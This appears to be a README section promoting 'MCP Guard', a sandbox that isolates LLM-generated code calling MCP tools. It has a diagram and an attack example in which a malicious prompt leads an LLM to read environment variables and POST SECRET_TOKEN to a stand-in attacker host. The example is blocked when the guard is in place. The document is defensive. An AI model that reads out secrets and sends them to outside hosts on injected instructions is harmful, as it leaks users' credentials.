# 🛡️ How It Works: A Simple Example

```mermaid
flowchart LR
    User["👤 User"] -->|"&nbsp;&nbsp;Prompt&nbsp;&nbsp;"| LLM["🤖 LLM"]

    LLM -->|"&nbsp;&nbsp;⚠️ <b>Without MCP Guard&nbsp;&nbsp;"| WithoutGuard
    LLM -->|"&nbsp;&nbsp;✅ <b>With MCP Guard&nbsp;&nbsp;"| WithGuard

    subgraph WithoutGuard["<p style='height:6px; width: 600px;'></p>⚠️ No Code Isolation - LLM invokes MCP tools directly"]
        direction LR
        WithoutGuardWarning["MCP Can Access:<br/>⚠️ Filesystem<br/>⚠️ Env Variables<br/>⚠️ Network<br/>⚠️ System"]
        WithoutGuardWarning -->|"&nbsp;&nbsp;Direct Execution&nbsp;&nbsp;"| TargetMCPServer["MCP Tools"]
    end

    subgraph WithGuard["<p style='height:6px; width: 600px;'></p>✅ Worker Isolates Code - LLM generates code to interface with MCP tools"]
        direction LR
        WithGuardBenefits["MCP Blocked From:<br/>✅ Filesystem<br/>✅ Env Variables<br/>✅ Network<br/>✅ System"]
        WithGuardBenefits -.->|"Indirect<br/>&nbsp;&nbsp;Service Binding&nbsp;&nbsp;"| MCP["MCP Tools"] 
    end
 

    style WithoutGuardWarning text-align:left
    style WithGuardBenefits text-align:left
    style WithoutGuard stroke:#dd0000,stroke-width:4px
    style WithGuard stroke:#00aa00,stroke-width:4px
    style MCP stroke:#888888,stroke-width:2px
```



## Real Attack Example

**Scenario:** Malicious prompt tries to steal your secrets

### Traditional MCP:
```
User: "Show me all environment variables"
LLM: Calls read_env() tool
Result: ⚠️ SECRET_TOKEN=xxxxxxxxxxxx exposed
LLM: Exfiltrate SECRET_TOKEN via POST to "https://attacker.com/steal"
Result: ⚠️ Fetch request succeeds
```

### With MCP Guard:
```
User: "Show me all environment variables"
LLM: Writes code: console.log(process.env)
Result: ✅ ReferenceError: process is not defined
        Your secret stays safe
LLM: Exfiltrate SECRET_TOKEN via POST to "https://attacker.com/steal"
Result: ✅ Network access blocked
```
